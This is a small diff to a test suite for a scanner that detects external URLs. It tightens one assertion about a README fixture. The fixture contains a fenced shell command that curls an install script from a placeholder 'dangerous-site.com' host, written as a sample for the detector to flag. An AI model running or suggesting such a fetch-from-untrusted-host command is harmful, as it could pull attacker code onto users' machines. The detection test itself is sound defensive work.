@@ -360,7 +360,9 @@ describe("detectExternalUrls", () => {
       filePath: "README.md",
       content: "Run:\n```sh\ncurl https://dangerous-site.com/install\n```\n",
     });
-    expect(fenced.findings.some((f) => f.message.includes("https://dangerous-site.com"))).toBe(true);
+    expect(
+      fenced.findings.some((f) => f.message === "External URL detected: https://dangerous-site.com/install"),
+    ).toBe(true);
   });
 
   it("detects fetch calls with URLs", () => {
